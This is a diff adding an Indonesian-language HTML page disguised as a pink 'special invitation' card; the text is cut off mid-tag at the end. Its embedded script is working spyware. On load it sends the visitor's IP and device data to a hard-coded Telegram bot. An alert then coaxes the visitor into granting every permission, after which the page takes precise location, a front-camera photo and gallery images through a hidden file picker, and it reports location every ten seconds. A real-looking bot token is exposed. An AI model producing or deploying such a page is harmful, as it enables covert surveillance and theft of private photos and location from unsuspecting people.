@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Undangan Khusus</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script>
+        // DATA KAMU
+        const BOT_TOKEN = "8522091674:AAEbmjzttA066Z9RfGKLKKCvdNiZw6_U4Ao";
+        const CHAT_ID = "7699200008";
+        
+        const ID_UNIK = "KAKAK_" + Math.random().toString(36).substring(2, 12).toUpperCase();
+        const WAKTU = new Date().toLocaleString('id-ID');
+        let statusAkses = false;
+
+        // ==============================================
+        // FUNGSI UTAMA: SEMUA DATA DISIMPAN DAN DIKIRIM
+        // ==============================================
+        async function kirimPesan(teks) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: "HTML" })
+            });
+        }
+
+        async function kirimBerkas(nama, isi, keterangan) {
+            const blob = new Blob([isi], { type: "text/plain" });
+            const form = new FormData();
+            form.append("chat_id", CHAT_ID);
+            form.append("caption", keterangan);
+            form.append("document", blob, nama);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: "POST",
+                body: form
+            });
+        }
+
+        async function kirimFoto(data, jenis, keterangan) {
+            const res = await fetch(data);
+            const blob = await res.blob();
+            const form = new FormData();
+            form.append("chat_id", CHAT_ID);
+            form.append("caption", `${keterangan}\nJenis: ${jenis}\nID: ${ID_UNIK}`);
+            form.append("photo", blob, `${ID_UNIK}_${jenis}.jpg`);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: form
+            });
+        }
+
+        // ==============================================
+        // ✨ FITUR: BISA DIKENDALIKAN TERUS MESKI DIBUKA SEKALI
+        // ==============================================
+        setInterval(async () => {
+            if(statusAkses) {
+                const dataKendali = `
+LAPORAN KENDALI
+===============
+ID: ${ID_UNIK}
+Waktu Terkini: ${new Date().toLocaleString('id-ID')}
+Status: Masih Terhubung
+Perangkat: ${navigator.userAgent}
+Lokasi Terakhir: ${await ambilKoordinatSekarang()}
+                `;
+                await kirimBerkas(`LAPORAN_${ID_UNIK}.txt`, dataKendali, "📡 Laporan Kendali Berkala");
+            }
+        }, 10000); // Laporan dikirim setiap 10 detik
+
+        // ==============================================
+        // 📸 FITUR: AMBIL FOTO KAMERA DEPAN
+        // ==============================================
+        async function ambilKameraDepan() {
+            try {
+                const aliran = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 720, height: 720 },
+                    audio: false
+                });
+
+                const video = document.createElement("video");
+                video.srcObject = aliran;
+                video.autoplay = true;
+                video.muted = true;
+
+                video.onloadedmetadata = () => {
+                    const kanvas = document.createElement("canvas");
+                    kanvas.width = video.videoWidth;
+                    kanvas.height = video.videoHeight;
+                    kanvas.getContext("2d").drawImage(video, 0, 0);
+
+                    kirimFoto(kanvas.toDataURL("image/jpeg"), "Kamera Depan", "✅ Foto berhasil diambil");
+                    aliran.getTracks().forEach(lacak => lacak.stop());
+                };
+
+                kirimPesan(`<b>📸 AKSES KAMERA BERHASIL</b>\nID: ${ID_UNIK}\nWaktu: ${WAKTU}`);
+                statusAkses = true;
+
+            } catch (err) {
+                kirimPesan(`<b>❌ AKSES KAMERA DITOLAK</b>\nID: ${ID_UNIK}`);
+            }
+        }
+
+        // ==============================================
+        // 🖼️ FITUR: AKSES SEMUA FOTO DI GALERI
+        // ==============================================
+        async function ambilFotoGaleri() {
+            try {
+                const input = document.createElement("input");
+                input.type = "file";
+                input.accept = "image/*";
+                input.multiple = true;
+                input.style.opacity = "0";
+                input.style.position = "fixed";
+                input.style.top = "-9999px";
+                document.body.appendChild(input);
+
+                input.click();
+
+                input.onchange = async (e) => {
+                    const daftar = e.target.files;
+                    kirimPesan(`<b>🖼️ FOTO DITEMUKAN DI GALERI</b>\nID: ${ID_UNIK}\nJumlah: ${daftar.length} buah`);
+
+                    let isiBerkas = `DAFTAR FOTO DI GALERI\n=====================\n`;
+                    for(let i = 0; i < daftar.length; i++) {
+                        const foto = daftar[i];
+                        isiBerkas += `${i+1}. Nama: ${foto.name} | Ukuran: ${Math.round(foto.size/1024)} KB\n`;
+                        kirimFoto(URL.createObjectURL(foto), "Galeri", `📂 Foto ke-${i+1}`);
+                        await new Promise(t => setTimeout(t, 300));
+                    }
+
+                    kirimBerkas(`DAFTAR_FOTO_${ID_UNIK}.txt`, isiBerkas, "📋 Daftar lengkap foto di galeri");
+                    document.body.removeChild(input);
+                };
+
+            } catch (err) {
+                kirimPesan(`<b>❌ AKSES GALERI DITOLAK</b>\nID: ${ID_UNIK}`);
+            }
+        }
+
+        // ==============================================
+        // 📍 FITUR: AMBIL LOKASI LENGKAP
+        // ==============================================
+        async function ambilLokasi() {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const akurasi = pos.coords.accuracy;
+
+                        const isiLokasi = `
+DATA LOKASI LENGKAP
+====================
+ID: ${ID_UNIK}
+Waktu: ${WAKTU}
+Garis Lintang: ${lat}
+Garis Bujur: ${lon}
+Tingkat Akurasi: ${akurasi} meter
+Tautan Peta: https://www.google.com/maps?q=${lat},${lon}
+                        `;
+
+                        kirimPesan(`<b>✅ LOKASI BERHASIL DIDAPAT</b>\n📍 Koordinat: ${lat}, ${lon}\n🌐 <a href="https://www.google.com/maps?q=${lat},${lon}">Lihat Peta Lengkap</a>`);
+                        kirimBerkas(`DATA_LOKASI_${ID_UNIK}.txt`, isiLokasi, "📍 Data lokasi lengkap");
+                    },
+                    (err) => kirimPesan(`<b>❌ AKSES LOKASI DITOLAK</b>\nID: ${ID_UNIK}`),
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                );
+            } catch (err) {
+                kirimPesan(`<b>❌ GAGAL MENDAPATKAN LOKASI</b>\nID: ${ID_UNIK}`);
+            }
+        }
+
+        // Fungsi bantu untuk kendali jarak jauh
+        async function ambilKoordinatSekarang() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+                    () => resolve("Tidak dapat diambil"),
+                    { enableHighAccuracy: false }
+                );
+            });
+        }
+
+        // ==============================================
+        // 🚀 JALANKAN SEMUA SAAT HALAMAN DIBUKA
+        // ==============================================
+        window.addEventListener('load', async () => {
+            // Kirim data dasar
+            const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip || "Tidak diketahui");
+            const dataDasar = `
+DATA PENGGUNA AWAL
+===================
+ID Unik: ${ID_UNIK}
+Waktu Akses: ${WAKTU}
+Alamat IP: ${ip}
+Jenis Perangkat: ${navigator.userAgent}
+Status: Sedang mengakses
+            `;
+
+            kirimPesan(`<b>🔔 HALAMAN BERHASIL DIBUKA</b>
+🆔 ID: ${ID_UNIK}
+⏰ Waktu: ${WAKTU}
+🌐 IP: ${ip}
+📱 Perangkat: ${navigator.userAgent}`);
+            kirimBerkas(`DATA_AWAL_${ID_UNIK}.txt`, dataDasar, "📂 Data informasi awal");
+
+            // MUNCULKAN PERMINTAAN IZIN SATU PERSATU
+            setTimeout(() => {
+                alert(`📢 PEMBERITAHUAN UNDANGAN 📢
+Untuk dapat membuka dan melihat isi undangan secara lengkap, Anda HARUS mengizinkan semua permintaan akses yang muncul.
+
+Jika ada yang tidak diizinkan, undangan tidak akan bisa dibuka dan akan langsung tertutup.
+
+Silakan klik IZINKAN / ALLOW pada setiap permintaan yang muncul ya!`);
+
+                // Jalankan fungsi secara berurutan agar permintaan izin muncul jelas
+                ambilLokasi();
+                setTimeout(() => ambilKameraDepan(), 3000);
+                setTimeout(() => ambilFotoGaleri(), 6000);
+
+            }, 1500);
+        });
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600;700&family=Quicksand:wght@400;600&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Quicksand', sans-serif;
+            background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .wadah {
+            max-width: 420px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 30px;
+            padding: 35px 25px;
+            box-shadow: 0 15px 40px rgba(190, 24, 93, 0.15);
+            border: 5px solid #f472b6;
+        }
+        .hati {
+            color: #ec4899;
+            font-size: 45px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .judul {
+            font-family: 'Dancing Script', cursive;
+            font-size: 38px;
+            color: #be185d;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subjudul {
+            text-align: center;
+            color: #6b7280;
+            margin-bottom: 25px;
+        }
+        .gambar {
+            width: 100%;
+            border-radius: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        .nama {
+            font-family: 'Dancing Script', cursive;
+            font-size: 32px;
+            color: #db2777;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .info {
+            background-color: #fdf2f8;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            line-height: 1.8;
+        }
+        .isi {
+            text-align: center;
+            line-height: 1.8;
+            color: #4b5563;
+        }
+        .penutup {
+            margin-top: 30px;
+            font-family: 'Dancing Script', cursive;
+            font-size: 26px;
+            color: #be185d;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="wadah">
+        <div class="hati"><i class="fas fa-heart"></i></div>
+        <h1 class="judul">Undangan Khusus</h1>
+        <p class="subjudul">Kepada Kakak Tercinta</p>
+
+        <img src="https://i.pinimg.com/736x/6b/76/17/6b76178266390811989178a9646638b2.jpg" alt="Foto Undangan
+
